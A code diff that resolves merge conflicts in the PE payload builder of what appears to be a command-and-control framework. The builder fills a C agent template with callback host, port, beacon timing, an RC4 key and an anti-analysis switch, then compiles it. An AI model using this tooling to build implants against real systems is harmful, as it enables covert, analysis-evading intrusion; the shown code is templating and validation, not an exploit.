@@ -33,22 +33,6 @@ logger = logging.getLogger("pupyteer.payloads.pe_builder")
 
 # --------------------------------------------------------------------------- #
 #  Template placeholders (defined in pe_template.c)
-<<<<<<< HEAD
-# --------------------------------------------------------------------------- #
-TEMPLATE_PLACEHOLDERS = (
-    "{{HOST}}",
-    "{{PORT}}",
-    "{{SLEEP}}",
-    "{{JITTER}}",
-    "{{RC4KEY}}",
-    "{{ANTI_ANALYSIS}}",
-)
-
-# Default RC4 transport key when the StubConfig does not supply one.
-# 8 hex digits (4 bytes) — deliberately weak by default; operators must set
-# payloads.pe_rc4_key or StubConfig.rc4_key to something real.
-DEFAULT_PE_RC4_KEY = "deadbeef"
-=======
 # --------------------------------------------------------------------------- #:
 # Every one of these has to appear in the template: a placeholder the renderer
 # stops filling is a value the built agent silently never learns, which is how
@@ -56,7 +40,7 @@ DEFAULT_PE_RC4_KEY = "deadbeef"
 # while the listener had been requiring both.
 TEMPLATE_PLACEHOLDERS = (
     "{{HOST}}", "{{PORT}}", "{{SLEEP}}", "{{JITTER}}", "{{AUTH}}",
-    "{{TLS}}", "{{TLS_FINGERPRINT}}",
+    "{{TLS}}", "{{TLS_FINGERPRINT}}", "{{RC4KEY}}", "{{ANTI_ANALYSIS}}",
 )
 
 #: Rendered into a C string literal, so anything that could end the literal
@@ -70,7 +54,9 @@ _FINGERPRINT_RE = re.compile(r"^[0-9a-f]{64}$")
 
 #: What a template still asks for after rendering.
 _PLACEHOLDER_RE = re.compile(r"\{\{[A-Z_]+\}\}")
->>>>>>> origin/nextgen
+
+# Default RC4 transport key when the StubConfig does not supply one.
+DEFAULT_PE_RC4_KEY = "deadbeef"
 
 # Default MinGW compiler
 DEFAULT_MINGW_PATH = "x86_64-w64-mingw32-gcc"
@@ -252,14 +238,10 @@ class PEBuilder:
     def _load_template(self) -> str:
         """Read the C agent template."""
         if self._template_path is None:
-<<<<<<< HEAD
-            # Default: relative to this file (pupyteer/payloads/ -> pupyteer/)
-=======
             # Default: relative to this file. pe_builder.py sits in
             # pupyteer/payloads/, so two parents, not three — a level too many
             # and the path points outside the package, which is a build that
             # cannot find its own template on any install.
->>>>>>> origin/nextgen
             tpl = (
                 Path(__file__).resolve().parent.parent
                 / "agent"
@@ -274,23 +256,6 @@ class PEBuilder:
         return tpl.read_text(encoding="utf-8")
 
     def _render(self, template: str, cfg: StubConfig) -> str:
-<<<<<<< HEAD
-        """Replace placeholders in the template with StubConfig values."""
-        # Key precedence: StubConfig.rc4_key > StubConfig.dns_key >
-        # config payloads.pe_rc4_key > built-in default. ConfigManager.get()
-        # returns its default only when the key is genuinely absent, so a
-        # None default cleanly distinguishes "unset" from "set to deadbeef".
-        rc4_key = getattr(cfg, "rc4_key", "") or getattr(cfg, "dns_key", "")
-        if not rc4_key:
-            rc4_key = self._config.get("payloads.pe_rc4_key", None)
-        replacements = {
-            "{{HOST}}": cfg.host or "127.0.0.1",
-            "{{PORT}}": str(cfg.port),
-            "{{SLEEP}}": str(cfg.sleep),
-            "{{JITTER}}": str(cfg.jitter),
-            "{{RC4KEY}}": rc4_key or DEFAULT_PE_RC4_KEY,
-            "{{ANTI_ANALYSIS}}": "1" if cfg.anti_analysis else "0",
-=======
         """Fill the template from the build config, or refuse to build.
 
         Both ways this fails have to be errors rather than a compiled artifact.
@@ -308,6 +273,12 @@ class PEBuilder:
                 f"{cfg.name or 'this'}'s build settings, and building it anyway "
                 "would produce an agent the listener refuses")
 
+        # RC4 transport key. Precedence: StubConfig.rc4_key > StubConfig.dns_key
+        # > config payloads.pe_rc4_key > built-in default.
+        rc4_key = getattr(cfg, "rc4_key", "") or getattr(cfg, "dns_key", "")
+        if not rc4_key:
+            rc4_key = self._config.get("payloads.pe_rc4_key", None)
+
         replacements = {
             "{{HOST}}": self._c_string("server host", cfg.host or "127.0.0.1"),
             "{{PORT}}": str(self._c_int("port", cfg.port)),
@@ -321,7 +292,9 @@ class PEBuilder:
             "{{AUTH}}": self._c_string("enrollment secret", cfg.auth_secret or ""),
             "{{TLS}}": "1" if cfg.tls else "0",
             "{{TLS_FINGERPRINT}}": self._pin_for(cfg),
->>>>>>> origin/nextgen
+            "{{RC4KEY}}": self._c_string("RC4 transport key",
+                                         rc4_key or DEFAULT_PE_RC4_KEY),
+            "{{ANTI_ANALYSIS}}": "1" if cfg.anti_analysis else "0",
         }
         src = template
         for placeholder, value in replacements.items():
